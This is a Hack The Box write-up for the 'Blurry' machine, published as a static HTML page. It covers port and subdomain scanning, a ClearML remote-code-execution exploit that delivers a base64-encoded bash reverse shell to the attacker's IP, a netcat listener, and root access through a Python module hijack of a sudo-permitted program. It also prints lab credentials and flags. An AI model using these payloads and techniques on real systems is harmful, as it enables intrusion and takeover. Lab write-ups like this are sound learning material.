@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.112.204 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 03:33 CST Nmap scan report for 10.129.112.204 Host is up (0.0091s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http
+Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-blurry/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.112.204 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 03:33 CST Nmap scan report for 10.129.112.204 Host is up (0.0091s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http
+Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+  <meta itemprop="wordCount" content="1907">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+nmap -p- 10.129.112.204 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 03:33 CST Nmap scan report for 10.129.112.204 Host is up (0.0091s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http
+Detailed port scan At the gedatialized port scan go to get more information from the services dien are open the ip address.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-blurry/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>nmap -p- 10.129.112.204
+</code></pre><p>Starting Nmap 7.94SVN ( <a href="https://nmap.org">https://nmap.org</a> ) at 2025-01-31 03:33 CST
+Nmap scan report for 10.129.112.204
+Host is up (0.0091s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</p>
+<h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the gedatialized port scan go to get more information from the services dien are open the ip address.</p>
+<pre tabindex="0"><code>nmap -p22,80 -sCV 10.129.112.204 -vvvv
+</code></pre><p>Starting Nmap 7.94SVN ( <a href="https://nmap.org">https://nmap.org</a> ) at 2025-01-31 03:34 CST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+Initiating Ping Scan at 03:34
+Scanning 10.129.112.204 [4 ports]
+Completed Ping Scan at 03:34, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 03:34
+Completed Parallel DNS resolution of 1 host. at 03:34, 0.00s elapsed
+DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 03:34
+Scanning 10.129.112.204 [2 ports]
+Discovered open port 80/tcp on 10.129.112.204
+Discovered open port 22/tcp on 10.129.112.204
+Completed SYN Stealth Scan at 03:34, 0.03s elapsed (2 total ports)
+Initiating Service scan at 03:34
+Scanning 2 services on 10.129.112.204
+Completed Service scan at 03:34, 6.03s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.112.204.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.74s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.04s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+Nmap scan report for 10.129.112.204
+Host is up, received echo-reply ttl 63 (0.0094s latency).
+Scanned at 2025-01-31 03:34:43 CST for 7s</p>
+<p>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
+|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
+80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
+|<em>http-server-header: nginx/1.18.0
+| http-methods:
+|</em>  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to <a href="http://app.blurry.htb/">http://app.blurry.htb/</a>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 03:34
+Completed NSE at 03:34, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
+Raw packets sent: 6 (240B) | Rcvd: 3 (116B)</p>
+<h2 id="directory-inintialization">Directory Inintialization</h2>
+<p>I am going to use the FFUF command to see what subdomains are on the domain “blurry.htb”</p>
+<pre tabindex="0"><code>ffuf -u http://blurry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &#34;Host:FUZZ.blurry.htb&#34; -ac
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blurry.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Header           : Host: FUZZ.blurry.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 13ms]
+chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 22ms]
+app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 10ms]
+Files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 32ms]
+Chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 25ms]
+App                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 11ms]
+FILES                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 18ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 4761 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
+</code></pre><p>I will now is to look at where the subdirectories take me. I went to add these subdirectories and started searching the Internet for “chat.blurry.htb”.</p>
+<p>![[Pasted image 20250131111306.png]]</p>
+<p>I am going to start creating an account on rocket.chat. We are going to start doing this using the following information.</p>
+<p>![[Pasted image 20250131112239.png]]</p>
+<p>1 once logged in you can see that we are in the channel General. But as you can see there is not really interesting in this channel.</p>
+<p>![[Pasted image 20250131112512.png]]</p>
+<p>So now I went to look at the 2nd subdomain of “blurry.htb”. The 2nd subdomain I went to look at is called “app.blurry.htb”</p>
+<p>![[Pasted image 20250131113250.png]]</p>
+<p>Once logged in, I went to see what version the “app.blurry.htb” is running on. There I saw that the WebApp, Server and API are running on next version.</p>
+<p>![[Pasted image 20250131113404.png]]</p>
+<p>Once logged in, I went to see what version the “app.blurry.htb” is running on. There I saw that the WebApp, Server and API are running on next version.</p>
+<ul>
+<li>WebApp = 1.13.1-426</li>
+<li>Server = 1.13.1-426</li>
+<li>API = 2.27</li>
+</ul>
+<p>![[Pasted image 20250131113656.png]]</p>
+<p>I will now search for an exploit for the clearml software version 1.13.1-426. By looking this up I came upon a remote code execution exploit. This is the following github exploit.</p>
+<p>![[Pasted image 20250131114459.png]]</p>
+<p>Before the exploit can be executed we will have to create a new credential in ClearML in the settings as described in the intialization. After that we will have to copy the payload, Access key and Secret key so that the connection can be established. Check out the setup for the exploit below.</p>
+<pre tabindex="0"><code>1] Initialize ClearML
+[2] Run exploit
+[0] Exit
+[&gt;] Choose an option: 1
+[+] Initializing ClearML
+[i] Press enter after pasting the configuration
+ClearML SDK setup process
+
+Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
+Or create a free account at https://app.clear.ml/settings/workspace-configuration
+
+In settings page, press &#34;Create new credentials&#34;, then press &#34;Copy to clipboard&#34;.
+
+Paste copied configuration here:
+Detected credentials key=&#34;52NE7V2HU2F5VRBE5742&#34; secret=&#34;6Jy5***&#34;
+
+ClearML Hosts configuration:
+Web App: http://app.blurry.htb
+API: http://api.blurry.htb
+File Store: http://files.blurry.htb
+
+Verifying credentials ...
+Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by &#39;NameResolutionError(&#34;&lt;urllib3.connection.HTTPConnection object at 0x7f13de4d7f20&gt;: Failed to resolve &#39;api.blurry.htb&#39; ([Errno -2] Name or service not known)&#34;)&#39;: /auth.login
+Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by &#39;NameResolutionError(&#34;&lt;urllib3.connection.HTTPConnection object at 0x7f13de4d67e0&gt;: Failed to resolve &#39;api.blurry.htb&#39; ([Errno -2] Name or service not known)&#34;)&#39;: /auth.login
+Error: could not verify credentials: key=52NE7V2HU2F5VRBE5742 secret=6Jy5rDbzW7O6zYm0cwk0PA660uph5bRbn52QLEjvINjg3TWc6W
+Enter user access key: Enter user secret: Verifying credentials ...
+Credentials verified!
+
+New configuration stored in /home/kali/clearml.conf
+ClearML setup completed successfully.
+</code></pre><p>Now that the setup is done we are going to set up a listener on a different tab so that when we run the exploit we get the connection to the ssh connection.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>We are now going to start implementing the exploit.</p>
+<pre tabindex="0"><code>[?] Do you want to go back to the main menu or exit? (menu/exit): menu
+[1] Initialize ClearML
+[2] Run exploit
+[0] Exit
+[&gt;] Choose an option: 2
+[+] Your IP: 10.10.16.33
+[+] Your Port: 4444
+[+] Target Project name Case Sensitive!: Black Swan
+[+] Payload to be used: echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMy80NDQ0IDA+JjEi | base64 -d | sh
+[?] Do you want to start a listener on 4444? (y/n): n
+[!] Remember to start a listener on 4444
+ClearML Task: created new task id=844ca253f2d94c36b4723462c2c36cfe
+ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/844ca253f2d94c36b4723462c2c36cfe/output/log
+CLEARML-SERVER new package available: UPGRADE to v2.0.0 is recommended!
+Release Notes:
+### Breaking Changes
+
+MongoDB major version was upgraded from v5.x to 6.x.
+Please note that if your current ClearML Server version is smaller than v1.17 (where MongoDB v5.x was first used), you&#39;ll need to first upgrade to ClearML Server v1.17.
+#### Upgrading to ClearML Server v1.17 from a previous version
+- If using docker-compose,  use the following docker-compose files:
+  * [docker-compose file](https://github.com/allegroai/clearml-server/blob/2976ce69cc91550a3614996e8a8d8cd799af2efd/upgrade/1_17_to_2_0/docker-compose.yml)
+  * [docker-compose file foe Windows](https://github.com/allegroai/clearml-server/blob/2976ce69cc91550a3614996e8a8d8cd799af2efd/upgrade/1_17_to_2_0/docker-compose-win10.yml)
+
+### New Features
+
+- New look and feel: Full light/dark themes ([clearml #1297](https://github.com/allegroai/clearml/issues/1297))
+- New UI task creation options
+  - Support bash as well as python scripts
+  - Support file upload
+- New UI setting for configuring cloud storage credentials with which ClearML can clean up cloud storage artifacts on task deletion. 
+- Add UI scalar plots presentation of plots in sections grouped by metrics.
+- Add UI Batch export plot embed codes for all metric plots in a single click.
+- Add UI pipeline presentation of steps grouped into stages
+
+### Bug Fixes
+- Fix UI Model Endpoint&#39;s Number of Requests plot sometimes displays incorrect data
+- Fix UI datasets page does not filter according to project when dataset is running 
+- Fix UI task scalar legend does not change colors when smoothing is enabled 
+- Fix queue list in UI Workers and Queues page does not alphabetically sort by queue display name 
+- Fix queue display name is not searchable in UI Task Creation modal&#39;s queue field
+
+ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
+[i] Please wait...
+</code></pre><p>As you can now see, we have a connection to the ssh server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                  
+listening on [any] 4444 ...
+ls
+id
+connect to [10.10.16.33] from (UNKNOWN) [10.129.69.45] 59450
+bash: cannot set terminal process group (2648): Inappropriate ioctl for device
+bash: no job control in this shell
+jippity@blurry:~$ ls
+automation
+clearml.conf
+user.txt
+jippity@blurry:~$ id
+uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
+</code></pre><p>As you can see now I have the user.txt (User flag).</p>
+<ul>
+<li>User flag = 274da3ac1bc269de665670625f1683c8</li>
+</ul>
+<pre tabindex="0"><code>jippity@blurry:~$ cat user.txt  
+cat user.txt
+274da3ac1bc269de665670625f1683c8
+</code></pre><p>I started using the command <code>sudo -L</code> to see if maybe I can start abusing a path where I can start running things in the root user&rsquo;s name with the user jippity. In doing so, I got the following.</p>
+<pre tabindex="0"><code>jippity@blurry:~$ sudo -l
+sudo -l
+Matching Defaults entries for jippity on blurry:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
+jippity@blurry:~$ 
+</code></pre><p>So I started looking up and using the following commands we can start getting root. The command “echo ‘import os; os.system(”bash“)’ &gt; /models/torch.py” will create or overwrite a Python file called <code>torch.py</code> in the <code>/models</code> directory. This file contains code that when executed will open a bash shell via the command <code>os.system(“bash”). Then the 2nd command “sudo /usr/bin/evaluate_model /models/demo_model.pth” will start executing the program “/usr/bin/evaluate_model” with elevated privileges (sudo without password). If this program uses the PyTorch framework and blindly calls </code>import torch<code>, it will load your malicious </code>/models/torch.py<code>instead of the official</code>torch` library. This will execute the code in your file, leading to the opening of a bash shell with root privileges. Together, these commands form an effective privilege escalation through a Python Path Hijack attack.</p>
+<pre tabindex="0"><code>jippity@blurry:~$ echo &#39;import os; os.system(&#34;bash&#34;)&#39; &gt; /models/torch.py
+echo &#39;import os; os.system(&#34;bash&#34;)&#39; &gt; /models/torch.py
+jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/demo_model.pth
+sudo /usr/bin/evaluate_model /models/demo_model.pth
+[+] Model /models/demo_model.pth is considered safe. Processing...
+</code></pre><p>As you will now be able to see below we have the user root.</p>
+<pre tabindex="0"><code>root@blurry:/home/jippity#
+</code></pre><p>And in doing so when I will then enter you <code>cat /root/root.txt</code> so now we will also have the root flag.</p>
+<p>Root flag = a7efada311156c40a88f05ffef359700</p>
+<pre tabindex="0"><code>root@blurry:/home/jippity# cat /root/root.txt
+cat /root/root.txt
+a7efada311156c40a88f05ffef359700
+root@blurry:/home/jippity# 
+</code></pre><p>![[Pasted image 20250206191404.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
